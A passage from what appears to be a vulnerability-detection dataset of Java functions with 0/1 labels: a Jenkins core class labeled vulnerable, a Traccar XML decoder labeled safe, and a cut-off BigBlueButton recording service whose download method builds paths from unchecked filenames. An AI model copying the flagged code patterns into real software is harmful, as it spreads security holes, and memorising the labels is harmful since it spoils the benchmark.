#XSTREAM} so that one can access additional methods on {@link XStream2} more easily.\n     */\n    public static final XStream2 XSTREAM2 = (XStream2)XSTREAM;\n\n    private static final int TWICE_CPU_NUM = Math.max(4, Runtime.getRuntime().availableProcessors() * 2);\n\n    /**\n     * Thread pool used to load configuration in parallel, to improve the start up time.\n     * <p>\n     * The idea here is to overlap the CPU and I/O, so we want more threads than CPU numbers.\n     */\n    /*package*/ transient final ExecutorService threadPoolForLoad = new ThreadPoolExecutor(\n        TWICE_CPU_NUM, TWICE_CPU_NUM,\n        5L, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>(), new DaemonThreadFactory());\n\n\n    private static void computeVersion(ServletContext context) {\n        // set the version\n        Properties props = new Properties();\n        try {\n            InputStream is = Jenkins.class.getResourceAsStream(\"jenkins-version.properties\");\n            if(is!=null)\n                props.load(is);\n        } catch (IOException e) {\n            e.printStackTrace(); // if the version properties is missing, that's OK.\n        }\n        String ver = props.getProperty(\"version\");\n        if(ver==null)   ver=\"?\";\n        VERSION = ver;\n        context.setAttribute(\"version\",ver);\n\n        VERSION_HASH = Util.getDigestOf(ver).substring(0, 8);\n        SESSION_HASH = Util.getDigestOf(ver+System.currentTimeMillis()).substring(0, 8);\n\n        if(ver.equals(\"?\") || Boolean.getBoolean(\"hudson.script.noCache\"))\n            RESOURCE_PATH = \"\";\n        else\n            RESOURCE_PATH = \"/static/\"+SESSION_HASH;\n\n        VIEW_RESOURCE_PATH = \"/resources/\"+ SESSION_HASH;\n    }\n\n    /**\n     * Version number of this Hudson.\n     */\n    public static String VERSION=\"?\";\n\n    /**\n     * Parses {@link #VERSION} into {@link VersionNumber}, or null if it's not parseable as a version number\n     * (such as when Hudson is run with \"mvn hudson-dev:run\")\n     */\n    public static VersionNumber getVersion() {\n        try {\n            return new VersionNumber(VERSION);\n        } catch (NumberFormatException e) {\n            try {\n                // for non-released version of Hudson, this looks like \"1.345 (private-foobar), so try to approximate.\n                int idx = VERSION.indexOf(' ');\n                if (idx>0)\n                    return new VersionNumber(VERSION.substring(0,idx));\n            } catch (NumberFormatException _) {\n                // fall through\n            }\n\n            // totally unparseable\n            return null;\n        } catch (IllegalArgumentException e) {\n            // totally unparseable\n            return null;\n        }\n    }\n\n    /**\n     * Hash of {@link #VERSION}.\n     */\n    public static String VERSION_HASH;\n\n    /**\n     * Unique random token that identifies the current session.\n     * Used to make {@link #RESOURCE_PATH} unique so that we can set long \"Expires\" header.\n     * \n     * We used to use {@link #VERSION_HASH}, but making this session local allows us to\n     * reuse the same {@link #RESOURCE_PATH} for static resources in plugins.\n     */\n    public static String SESSION_HASH;\n\n    /**\n     * Prefix to static resources like images and javascripts in the war file.\n     * Either \"\" or strings like \"/static/VERSION\", which avoids Hudson to pick up\n     * stale cache when the user upgrades to a different version.\n     * <p>\n     * Value computed in {@link WebAppMain}.\n     */\n    public static String RESOURCE_PATH = \"\";\n\n    /**\n     * Prefix to resources alongside view scripts.\n     * Strings like \"/resources/VERSION\", which avoids Hudson to pick up\n     * stale cache when the user upgrades to a different version.\n     * <p>\n     * Value computed in {@link WebAppMain}.\n     */\n    public static String VIEW_RESOURCE_PATH = \"/resources/TBD\";\n\n    public static boolean PARALLEL_LOAD = Configuration.getBooleanConfigParameter(\"parallelLoad\", true);\n    public static boolean KILL_AFTER_LOAD = Configuration.getBooleanConfigParameter(\"killAfterLoad\", false);\n    /**\n     * Enabled by default as of 1.337. Will keep it for a while just in case we have some serious problems.\n     */\n    public static boolean FLYWEIGHT_SUPPORT = Configuration.getBooleanConfigParameter(\"flyweightSupport\", true);\n\n    /**\n     * Tentative switch to activate the concurrent build behavior.\n     * When we merge this back to the trunk, this allows us to keep\n     * this feature hidden for a while until we iron out the kinks.\n     * @see AbstractProject#isConcurrentBuild()\n     * @deprecated as of 1.464\n     *      This flag will have no effect.\n     */\n    @Restricted(NoExternalUse.class)\n    public static boolean CONCURRENT_BUILD = true;\n\n    /**\n     * Switch to enable people to use a shorter workspace name.\n     */\n    private static final String WORKSPACE_DIRNAME = Configuration.getStringConfigParameter(\"workspaceDirName\", \"workspace\");\n\n    /**\n     * Automatically try to launch a slave when Jenkins is initialized or a new slave is created.\n     */\n    public static boolean AUTOMATIC_SLAVE_LAUNCH = true;\n\n    private static final Logger LOGGER = Logger.getLogger(Jenkins.class.getName());\n\n    private static final Pattern ICON_SIZE = Pattern.compile(\"\\\\d+x\\\\d+\");\n\n    public static final PermissionGroup PERMISSIONS = Permission.HUDSON_PERMISSIONS;\n    public static final Permission ADMINISTER = Permission.HUDSON_ADMINISTER;\n    public static final Permission READ = new Permission(PERMISSIONS,\"Read\",Messages._Hudson_ReadPermission_Description(),Permission.READ,PermissionScope.JENKINS);\n    public static final Permission RUN_SCRIPTS = new Permission(PERMISSIONS, \"RunScripts\", Messages._Hudson_RunScriptsPermission_Description(),ADMINISTER,PermissionScope.JENKINS);\n\n    /**\n     * {@link Authentication} object that represents the anonymous user.\n     * Because Acegi creates its own {@link AnonymousAuthenticationToken} instances, the code must not\n     * expect the singleton semantics. This is just a convenient instance.\n     *\n     * @since 1.343\n     */\n    public static final Authentication ANONYMOUS = new AnonymousAuthenticationToken(\n            \"anonymous\",\"anonymous\",new GrantedAuthority[]{new GrantedAuthorityImpl(\"anonymous\")});\n\n    static {\n        XSTREAM.alias(\"jenkins\",Jenkins.class);\n        XSTREAM.alias(\"slave\", DumbSlave.class);\n        XSTREAM.alias(\"jdk\",JDK.class);\n        // for backward compatibility with <1.75, recognize the tag name \"view\" as well.\n        XSTREAM.alias(\"view\", ListView.class);\n        XSTREAM.alias(\"listView\", ListView.class);\n        // this seems to be necessary to force registration of converter early enough\n        Mode.class.getEnumConstants();\n\n        // double check that initialization order didn't do any harm\n        assert PERMISSIONS!=null;\n        assert ADMINISTER!=null;\n    }\n\n}\n", "target": 1}
{"idx": 1073, "func": "/*\n * Copyright 2017 - 2019 Anton Tananaev (anton@traccar.org)\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.traccar.protocol;\n\nimport com.fasterxml.jackson.databind.util.ByteBufferBackedInputStream;\nimport io.netty.channel.Channel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport org.traccar.BaseHttpProtocolDecoder;\nimport org.traccar.DeviceSession;\nimport org.traccar.Protocol;\nimport org.traccar.helper.DateUtil;\nimport org.traccar.model.Position;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\n\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.xpath.XPath;\nimport javax.xml.xpath.XPathConstants;\nimport javax.xml.xpath.XPathExpression;\nimport javax.xml.xpath.XPathExpressionException;\nimport javax.xml.xpath.XPathFactory;\nimport java.net.SocketAddress;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class SpotProtocolDecoder extends BaseHttpProtocolDecoder {\n\n    private DocumentBuilder documentBuilder;\n    private XPath xPath;\n    private XPathExpression messageExpression;\n\n    public SpotProtocolDecoder(Protocol protocol) {\n        super(protocol);\n        try {\n            DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();\n            builderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n            builderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n            builderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n            builderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n            builderFactory.setXIncludeAware(false);\n            builderFactory.setExpandEntityReferences(false);\n            documentBuilder = builderFactory.newDocumentBuilder();\n            xPath = XPathFactory.newInstance().newXPath();\n            messageExpression = xPath.compile(\"//messageList/message\");\n        } catch (ParserConfigurationException | XPathExpressionException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    protected Object decode(\n            Channel channel, SocketAddress remoteAddress, Object msg) throws Exception {\n\n        FullHttpRequest request = (FullHttpRequest) msg;\n\n        Document document = documentBuilder.parse(new ByteBufferBackedInputStream(request.content().nioBuffer()));\n        NodeList nodes = (NodeList) messageExpression.evaluate(document, XPathConstants.NODESET);\n\n        List<Position> positions = new LinkedList<>();\n\n        for (int i = 0; i < nodes.getLength(); i++) {\n            Node node = nodes.item(i);\n            DeviceSession deviceSession = getDeviceSession(channel, remoteAddress, xPath.evaluate(\"esnName\", node));\n            if (deviceSession != null) {\n\n                Position position = new Position(getProtocolName());\n                position.setDeviceId(deviceSession.getDeviceId());\n\n                position.setValid(true);\n                position.setTime(DateUtil.parseDate(xPath.evaluate(\"timestamp\", node)));\n                position.setLatitude(Double.parseDouble(xPath.evaluate(\"latitude\", node)));\n                position.setLongitude(Double.parseDouble(xPath.evaluate(\"longitude\", node)));\n\n                position.set(Position.KEY_EVENT, xPath.evaluate(\"messageType\", node));\n\n                positions.add(position);\n\n            }\n        }\n\n        sendResponse(channel, HttpResponseStatus.OK);\n        return positions;\n    }\n\n}\n", "target": 0}
{"idx": 1074, "func": "/**\n * BigBlueButton open source conferencing system - http://www.bigbluebutton.org/\n *\n * Copyright (c) 2012 BigBlueButton Inc. and by respective authors (see below).\n *\n * This program is free software; you can redistribute it and/or modify it under the\n * terms of the GNU Lesser General Public License as published by the Free Software\n * Foundation; either version 3.0 of the License, or (at your option) any later\n * version.\n *\n * BigBlueButton is distributed in the hope that it will be useful, but WITHOUT ANY\n * WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A\n * PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License along\n * with BigBlueButton; if not, see <http://www.gnu.org/licenses/>.\n *\n */\n\npackage org.bigbluebutton.api;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.file.DirectoryStream;\nimport java.nio.file.FileSystems;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\n\nimport org.apache.commons.io.FileUtils;\nimport org.apache.commons.io.FilenameUtils;\nimport org.bigbluebutton.api.domain.Recording;\nimport org.bigbluebutton.api.domain.RecordingMetadata;\nimport org.bigbluebutton.api.messaging.messages.MakePresentationDownloadableMsg;\nimport org.bigbluebutton.api.util.RecordingMetadataReaderHelper;\nimport org.bigbluebutton.api2.domain.UploadedTrack;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RecordingService {\n    private static Logger log = LoggerFactory.getLogger(RecordingService.class);\n\n    private static String processDir = \"/var/bigbluebutton/recording/process\";\n    private static String publishedDir = \"/var/bigbluebutton/published\";\n    private static String unpublishedDir = \"/var/bigbluebutton/unpublished\";\n    private static String deletedDir = \"/var/bigbluebutton/deleted\";\n    private RecordingMetadataReaderHelper recordingServiceHelper;\n    private String recordStatusDir;\n    private String captionsDir;\n    private String presentationBaseDir;\n    private String defaultServerUrl;\n    private String defaultTextTrackUrl;\n\n    private void copyPresentationFile(File presFile, File dlownloadableFile) {\n        try {\n            FileUtils.copyFile(presFile, dlownloadableFile);\n        } catch (IOException ex) {\n            log.error(\"Failed to copy file: {}\", ex);\n        }\n    }\n\n    public void processMakePresentationDownloadableMsg(MakePresentationDownloadableMsg msg) {\n        File presDir = Util.getPresentationDir(presentationBaseDir, msg.meetingId, msg.presId);\n        File downloadableFile = new File(presDir.getAbsolutePath() + File.separatorChar + msg.presFilename);\n\n        if (presDir != null) {\n            if (msg.downloadable) {\n                String fileExt = FilenameUtils.getExtension(msg.presFilename);\n                File presFile = new File(presDir.getAbsolutePath() + File.separatorChar + msg.presId + \".\" + fileExt);\n                log.info(\"Make file downloadable. {}\", downloadableFile.getAbsolutePath());\n                copyPresentationFile(presFile, downloadableFile);\n            } else {\n                if (downloadableFile.exists()) {\n                    if(downloadableFile.delete()) {\n                        log.info(\"File deleted. {}\", downloadableFile.getAbsolutePath());\n                    } else {\n                        log.warn(\"Failed to delete. {}\", downloadableFile.getAbsolutePath());\n                    }\n                }\n            }\n        }\n    }\n\n    public File getDownloadablePresentationFile(String meetingId, String presId, String presFilename) {\n    \tlog.info(\"Find downloadable presentation for meetingId={} presId={} filename={}\", meetingId, presId, presFilename);\n\n        File presDir = Util.getPresentationDir(presentationBaseDir, meetingId, presId);\n        return new File(presDir.getAbsolutePath() + File.separatorChar + presFilename);\n    }\n\n    public void kickOffRecordingChapterBreak(String meetingId, Long timestamp) {\n        String done = recordStatusDir + File.separatorChar + meetingId + \"-\" + timestamp + \".done\";\n\n        File doneFile = new File(done);\n        if (!doneFile.exists()) {\n            try {\n                doneFile.createNewFile();\n                if (!doneFile.exists())\n                    log.error(\"Failed to create {} file.\", done);\n            } catch (IOException e) {\n                log.error(\"Exception occured when trying to create {} file\", done);\n            }\n        } else {\n            log.error(\"{} file already exists.\", done);\n        }\n    }\n\n    public void startIngestAndProcessing(String meetingId) {\n        String done = recordStatusDir + File.separatorChar + meetingId + \".done\";\n\n        File doneFile = new File(done);\n        if (!doneFile.exists()) {\n            try {\n                doneFile.createNewFile();\n                if (!doneFile.exists())\n                    log.error(\"Failed to create {} file.\", done);\n            } catch (IOException e) {\n                log.error(\"Exception occured when trying to create {} file.\", done);\n            }\n        } else {\n            log.error(\"{} file already exists.\", done);\n        }\n    }\n\n    public void markAsEnded(String meetingId) {\n        String done = recordStatusDir + \"/../ended/\" + meetingId + \".done\";\n\n        File doneFile = new File(done);\n        if (!doneFile.exists()) {\n            try {\n                doneFile.createNewFile();\n                if (!doneFile.exists())\n                    log.error(\"Failed to create \" + done + \" file.\");\n            } catch (IOException e) {\n                log.error(\"Exception occured when trying to create {} file.\", done);\n            }\n        } else {\n            log.error(done + \" file already exists.\");\n        }\n    }\n\n    public List<RecordingMetadata> getRecordingsMetadata(List<String> recordIDs, List<String> states) {\n        List<RecordingMetadata> recs = new ArrayList<>();\n\n        Map<String, List<File>> allDirectories = getAllDirectories(states);\n        if (recordIDs.isEmpty()) {\n            for (Map.Entry<String, List<File>> entry : allDirectories.entrySet()) {\n                recordIDs.addAll(getAllRecordingIds(entry.getValue()));\n            }\n        }\n\n        for (String recordID : recordIDs) {\n            for (Map.Entry<String, List<File>> entry : allDirectories.entrySet()) {\n                List<File> _recs = getRecordingsForPath(recordID, entry.getValue());\n                for (File _rec : _recs) {\n                    RecordingMetadata r = getRecordingMetadata(_rec);\n                    if (r != null) {\n                        recs.add(r);\n                    }\n                }\n            }\n        }\n\n        return recs;\n    }\n\n    public Boolean validateTextTrackSingleUseToken(String recordId, String caption, String token) {\n        return recordingServiceHelper.validateTextTrackSingleUseToken(recordId, caption, token);\n    }\n\n    public String getRecordingTextTracks(String recordId) {\n        return recordingServiceHelper.getRecordingTextTracks(recordId, captionsDir, getCaptionFileUrlDirectory());\n    }\n\n    public String putRecordingTextTrack(UploadedTrack track) {\n        return recordingServiceHelper.putRecordingTextTrack(track);\n    }\n\n    public String getRecordings2x(List<String> idList, List<String> states, Map<String, String> metadataFilters) {\n        List<RecordingMetadata> recsList = getRecordingsMetadata(idList, states);\n        ArrayList<RecordingMetadata> recs = filterRecordingsByMetadata(recsList, metadataFilters);\n        return recordingServiceHelper.getRecordings2x(recs);\n    }\n\n    private RecordingMetadata getRecordingMetadata(File dir) {\n        File file = new File(dir.getPath() + File.separatorChar + \"metadata.xml\");\n        return recordingServiceHelper.getRecordingMetadata(file);\n    }\n\n    public boolean recordingMatchesMetadata(RecordingMetadata recording, Map<String, String> metadataFilters) {\n        boolean matchesMetadata = true;\n        Map<String, String> recMeta = recording.getMeta();\n        for (Map.Entry<String, String> filter : metadataFilters.entrySet()) {\n            String metadataValue = recMeta.get(filter.getKey());\n            if ( metadataValue == null ) {\n                // The recording doesn't have metadata specified\n                matchesMetadata = false;\n            } else {\n                String filterValue = filter.getValue();\n                if( filterValue.charAt(0) == '%' && filterValue.charAt(filterValue.length()-1) == '%' && metadataValue.contains(filterValue.substring(1, filterValue.length()-1)) ){\n                    // Filter value embraced by two wild cards\n                    // AND the filter value is part of the metadata value\n                } else if( filterValue.charAt(0) == '%' && metadataValue.endsWith(filterValue.substring(1, filterValue.length())) ) {\n                    // Filter value starts with a wild cards\n                    // AND the filter value ends with the metadata value\n                } else if( filterValue.charAt(filterValue.length()-1) == '%' && metadataValue.startsWith(filterValue.substring(0, filterValue.length()-1)) ) {\n                    // Filter value ends with a wild cards\n                    // AND the filter value starts with the metadata value\n                } else if( metadataValue.equals(filterValue) ) {\n                    // Filter value doesnt have wildcards\n                    // AND the filter value is the same as metadata value\n                } else {\n                    matchesMetadata = false;\n                }\n            }\n        }\n        return matchesMetadata;\n    }\n\n\n    public ArrayList<RecordingMetadata> filterRecordingsByMetadata(List<RecordingMetadata> recordings, Map<String, String> metadataFilters) {\n        ArrayList<RecordingMetadata> resultRecordings = new ArrayList<>();\n        for (RecordingMetadata entry : recordings) {\n            if (recordingMatchesMetadata(entry, metadataFilters))\n                resultRecordings.add(entry);\n        }\n        return resultRecordings;\n    }\n\n    private ArrayList<File> getAllRecordingsFor(String recordId) {\n        String[] format = getPlaybackFormats(publishedDir);\n        ArrayList<File> ids = new ArrayList<File>();\n\n        for (int i = 0; i < format.length; i++) {\n            List<File> recordings = getDirectories(publishedDir + File.separatorChar + format[i]);\n            for (int f = 0; f < recordings.size(); f++) {\n                if (recordId.equals(recordings.get(f).getName()))\n                    ids.add(recordings.get(f));\n            }\n        }\n\n        return ids;\n    }\n\n    public boolean isRecordingExist(String recordId) {\n        List<String> publishList = getAllRecordingIds(publishedDir);\n        List<String> unpublishList = getAllRecordingIds(unpublishedDir);\n        if (publishList.contains(recordId) || unpublishList.contains(recordId)) {\n            return true;\n        }\n\n        return false;\n    }\n\n    public boolean existAnyRecording(List<String> idList) {\n        List<String> publishList = getAllRecordingIds(publishedDir);\n        List<String> unpublishList = getAllRecordingIds(unpublishedDir);\n\n        for (String id : idList) {\n            if (publishList.contains(id) || unpublishList.contains(id)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    private List<String> getAllRecordingIds(String path) {\n        String[] format = getPlaybackFormats(path);\n\n        return getAllRecordingIds(path, format);\n    }\n\n    private List<String> getAllRecordingIds(String path, String[] format) {\n        List<String> ids = new ArrayList<>();\n\n        for (String aFormat : format) {\n            List<File> recordings = getDirectories(path + File.separatorChar + aFormat);\n            for (File recording : recordings) {\n                if (!ids.contains(recording.getName())) {\n                    ids.add(recording.getName());\n                }\n            }\n        }\n\n        return ids;\n    }\n\n    private Set<String> getAllRecordingIds(List<File> recs) {\n        Set<String> ids = new HashSet<>();\n\n        Iterator<File> iterator = recs.iterator();\n        while (iterator.hasNext()) {\n            ids.add(iterator.next().getName());\n        }\n\n        return ids;\n    }\n\n    private List<File> getRecordingsForPath(String id, List<File> recordings) {\n        List<File> recs = new ArrayList<>();\n\n        Iterator<File> iterator = recordings.iterator();\n        while (iterator.hasNext()) {\n            File rec = iterator.next();\n            if (rec.getName().startsWith(id)) {\n              recs.add(rec);\n            }\n        }\n        return recs;\n    }\n\n    private static void deleteRecording(String id, String path) {\n        String[] format = getPlaybackFormats(path);\n        for (String aFormat : format) {\n            List<File> recordings = getDirectories(path + File.separatorChar + aFormat);\n            for (File recording : recordings) {\n                if (recording.getName().equals(id)) {\n                    deleteDirectory(recording);\n                    createDirectory(recording);\n                }\n            }\n        }\n    }\n\n    private static void createDirectory(File directory) {\n        if (!directory.exists())\n            directory.mkdirs();\n    }\n\n    private static void deleteDirectory(File directory) {\n        /**\n         * Go through each directory and check if it's not empty. We need to\n         * delete files inside a directory before a directory can be deleted.\n         **/\n        File[] files = directory.listFiles();\n        for (File file : files) {\n            if (file.isDirectory()) {\n                deleteDirectory(file);\n            } else {\n                file.delete();\n            }\n        }\n        // Now that the directory is empty. Delete it.\n        directory.delete();\n    }\n\n    private static List<File> getDirectories(String path) {\n        List<File> files = new ArrayList<>();\n        try {\n            DirectoryStream<Path> stream = Files.newDirectoryStream(FileSystems.getDefault().getPath(path));\n            Iterator<Path> iter = stream.iterator();\n            while (iter.hasNext()) {\n                Path next = iter.next();\n                files.add(next.toFile());\n            }\n            stream.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return files;\n    }\n\n    private static String[] getPlaybackFormats(String path) {\n        System.out.println(\"Getting playback formats at \" + path);\n        List<File> dirs = getDirectories(path);\n        String[] formats = new String[dirs.size()];\n\n        for (int i = 0; i < dirs.size(); i++) {\n            System.out.println(\"Playback format = \" + dirs.get(i).getName());\n            formats[i] = dirs.get(i).getName();\n        }\n        return formats;\n    }\n\n    public void setRecordingStatusDir(String dir) {\n        recordStatusDir = dir;\n    }\n\n    public void setUnpublishedDir(String dir) {\n        unpublishedDir = dir;\n    }\n\n    public void setPresentationBaseDir(String dir) {\n        presentationBaseDir = dir;\n    }\n\n    public void setDefaultServerUrl(String url) {\n        defaultServerUrl = url;\n    }\n\n    public void setDefaultTextTrackUrl(String url) {\n        defaultTextTrackUrl = url;\n    }\n\n    public void setPublishedDir(String dir) {\n        publishedDir = dir;\n    }\n\n    public void setCaptionsDir(String dir) {\n        captionsDir = dir;\n    }\n\n    public void setRecordingServiceHelper(RecordingMetadataReaderHelper r) {\n        recordingServiceHelper = r;\n    }\n\n    private boolean shouldIncludeState(List<String> states, String type) {\n        boolean r = false;\n\n        if (!states.isEmpty()) {\n            if (states.contains(\"any\")) {\n                r = true;\n            } else {\n                if (type.equals(Recording.STATE_PUBLISHED) && states.contains(Recording.STATE_PUBLISHED)) {\n                    r = true;\n                } else if (type.equals(Recording.STATE_UNPUBLISHED) && states.contains(Recording.STATE_UNPUBLISHED)) {\n                    r = true;\n                } else if (type.equals(Recording.STATE_DELETED) && states.contains(Recording.STATE_DELETED)) {\n                    r = true;\n                } else if (type.equals(Recording.STATE_PROCESSING) && states.contains(Recording.STATE_PROCESSING)) {\n                    r = true;\n                } else if (type.equals(Recording.STATE_PROCESSED) && states.contains(Recording.STATE_PROCESSED)) {\n                    r = true;\n                }\n            }\n\n        } else {\n            if (type.equals(Recording.STATE_PUBLISHED) || type.equals(Recording.STATE_UNPUBLISHED)) {\n                r = true;\n            }\n        }\n\n        return r;\n    }\n\n    public boolean changeState(String recordingId, String state) {\n        boolean succeeded = false;\n        if (state.equals(Recording.STATE_PUBLISHED)) {\n            // It can only be published if it is unpublished\n            succeeded |= changeState(unpublishedDir, recordingId, state);\n        } else if (state.equals(Recording.STATE_UNPUBLISHED)) {\n            // It can only be unpublished if it is published\n            succeeded |= changeState(publishedDir, recordingId, state);\n        } else if (state.equals(Recording.STATE_DELETED)) {\n            // It can be deleted from any state\n            succeeded |= changeState(publishedDir, recordingId, state);\n            succeeded |= changeState(unpublishedDir, recordingId, state);\n        }\n        return succeeded;\n    }\n\n    private boolean changeState(String path, String recordingId, String state) {\n        boolean exists = false;\n        boolean succeeded = true;\n        String[] format = getPlaybackFormats(path);\n         for (String aFormat : format) {\n            List<File> recordings = getDirectories(path + File.separatorChar + aFormat);\n            for (File recording : recordings) {\n                if (recording.getName().equalsIgnoreCase(recordingId)) {\n                    exists = true;\n                    File dest;\n                    if (state.equals(Recording.STATE_PUBLISHED)) {\n                       dest = new File(publishedDir + File.separatorChar + aFormat);\n                       succeeded &= publishRecording(dest, recordingId, recording, aFormat);\n                    } else if (state.equals(Recording.STATE_UNPUBLISHED)) {\n                       dest = new File(unpublishedDir + File.separatorChar + aFormat);\n                       succeeded &= unpublishRecording(dest, recordingId, recording, aFormat);\n                    } else if (state.equals(Recording.STATE_DELETED)) {\n                       dest = new File(deletedDir + File.separatorChar + aFormat);\n                       succeeded &= deleteRecording(dest, recordingId, recording, aFormat);\n                    } else {\n                       log.debug(String.format(\"State: %s, is not supported\", state));\n                       return false;\n                    }\n                }\n            }\n        }\n        return exists && succeeded;\n    }\n\n    public boolean publishRecording(File destDir, String recordingId, File recordingDir, String format) {\n        File metadataXml = recordingServiceHelper.getMetadataXmlLocation(recordingDir.getPath());\n        RecordingMetadata r = recordingServiceHelper.getRecordingMetadata(metadataXml);\n        if (r != null) {\n            if (!destDir.exists()) destDir.mkdirs();\n\n            try {\n                FileUtils.moveDirectory(recordingDir, new File(destDir.getPath() + File.separatorChar + recordingId));\n\n                r.setState(Recording.STATE_PUBLISHED);\n                r.setPublished(true);\n\n                File medataXmlFile = recordingServiceHelper.getMetadataXmlLocation(\n                  destDir.getAbsolutePath() + File.separatorChar + recordingId);\n\n                // Process the changes by saving the recording into metadata.xml\n                return recordingServiceHelper.saveRecordingMetadata(medataXmlFile, r);\n            } catch (IOException e) {\n              log.error(\"Failed to publish recording : \" + recordingId, e);\n            }\n        }\n        return false;\n    }\n\n    public boolean unpublishRecording(File destDir, String recordingId, File recordingDir, String format) {\n        File metadataXml = recordingServiceHelper.getMetadataXmlLocation(recordingDir.getPath());\n\n        RecordingMetadata r = recordingServiceHelper.getRecordingMetadata(metadataXml);\n        if (r != null) {\n            if (!destDir.exists()) destDir.mkdirs();\n\n            try {\n                FileUtils.moveDirectory(recordingDir, new File(destDir.getPath() + File.separatorChar + recordingId));\n                r.setState(Recording.STATE_UNPUBLISHED);\n                r.setPublished(false);\n\n                File medataXmlFile = recordingServiceHelper.getMetadataXmlLocation(\n                  destDir.getAbsolutePath() + File.separatorChar + recordingId);\n\n                // Process the changes by saving the recording into metadata.xml\n                return recordingServiceHelper.saveRecordingMetadata(medataXmlFile, r);\n            } catch (IOException e) {\n              log.error(\"Failed to unpublish recording : \" + recordingId, e);\n            }\n        }\n        return false;\n    }\n\n    public boolean deleteRecording(File destDir, String recordingId, File recordingDir, String format) {\n        File metadataXml = recordingServiceHelper.getMetadataXmlLocation(recordingDir.getPath());\n\n        RecordingMetadata r = recordingServiceHelper.getRecordingMetadata(metadataXml);\n        if (r != null) {\n            if (!destDir.exists()) destDir.mkdirs();\n\n            try {\n                FileUtils.moveDirectory(recordingDir, new File(destDir.getPath() + File.separatorChar + recordingId));\n                r.setState(Recording.STATE_DELETED);\n                r.setPublished(false);\n\n                File medataXmlFile = recordingServiceHelper.getMetadataXmlLocation(\n                  destDir.getAbsolutePath() + File.separatorChar + recordingId);\n\n                // Process the changes by saving the recording into metadata.xml\n                return recordingServiceHelper.saveRecordingMetadata(medataXmlFile, r);\n            } catch (IOException e) {\n              log.error(\"Failed to delete recording : \" + recordingId, e);\n            }\n        }\n        return false;\n    }\n\n\n    private List<File> getAllDirectories(String state) {\n        List<File> allDirectories = new ArrayList<>();\n\n        String dir = getDestinationBaseDirectoryName(state);\n\n        if ( dir != null ) {\n            String[] formats = getPlaybackFormats(dir);\n            for (String format : formats) {\n                allDirectories.addAll(getDirectories(dir + File.separatorChar + format));\n            }\n        }\n\n        return allDirectories;\n    }\n\n    private Map<String, List<File>> getAllDirectories(List<String> states) {\n        Map<String, List<File>> allDirectories = new HashMap<>();\n\n        if ( shouldIncludeState(states, Recording.STATE_PUBLISHED) ) {\n            List<File> listedDirectories = getAllDirectories(Recording.STATE_PUBLISHED);\n            allDirectories.put(Recording.STATE_PUBLISHED, listedDirectories);\n        }\n\n        if ( shouldIncludeState(states, Recording.STATE_UNPUBLISHED) ) {\n            List<File> listedDirectories = getAllDirectories(Recording.STATE_UNPUBLISHED);\n            allDirectories.put(Recording.STATE_UNPUBLISHED, listedDirectories);\n        }\n\n        if ( shouldIncludeState(states, Recording.STATE_DELETED) ) {\n            List<File> listedDirectories = getAllDirectories(Recording.STATE_DELETED);\n            allDirectories.put(Recording.STATE_DELETED, listedDirectories);\n        }\n\n        if ( shouldIncludeState(states, Recording.STATE_PROCESSING) ) {\n            List<File> listedDirectories = getAllDirectories(Recording.STATE_PROCESSING);\n            allDirectories.put(Recording.STATE_PROCESSING, listedDirectories);\n        }\n\n        if ( shouldIncludeState(states, Recording.STATE_PROCESSED) ) {\n            List<File> listedDirectories = getAllDirectories(Recording.STATE_PROCESSED);\n            allDirectories.put(Recording.STATE_PROCESSED, listedDirectories);\n        }\n\n        return allDirectories;\n    }\n\n    public void updateMetaParams(List<String> recordIDs, Map<String,String> metaParams) {\n        // Define the directories used to lookup the recording\n        List<String> states = new ArrayList<>();\n        states.add(Recording.STATE_PUBLISHED);\n        states.add(Recording.STATE_UNPUBLISHED);\n        states.add(Recording.STATE_DELETED);\n\n        // Gather all the existent directories based on the states defined for the lookup\n        Map<String, List<File>> allDirectories = getAllDirectories(states);\n\n        // Retrieve the actual recording from the directories gathered for the lookup\n        for (String recordID : recordIDs) {\n            for (Map.Entry<String, List<File>> entry : allDirectories.entrySet()) {\n                List<File> recs = getRecordingsForPath(recordID, entry.getValue());\n\n                // Go through all recordings of all formats\n                for (File rec : recs) {\n                    File metadataXml = recordingServiceHelper.getMetadataXmlLocation(rec.getPath());\n                    updateRecordingMetadata(metadataXml, metaParams, metadataXml);\n                }\n            }\n        }\n    }\n\n    public void updateRecordingMetadata(File srxMetadataXml, Map<String,String> metaParams, File destMetadataXml) {\n        RecordingMetadata rec = recordingServiceHelper.getRecordingMetadata(srxMetadataXml);\n\n        Map<String, String> recMeta = rec.getMeta();\n\n        if (rec != null && !recMeta.isEmpty()) {\n            for (Map.Entry<String,String> meta : metaParams.entrySet()) {\n                if ( 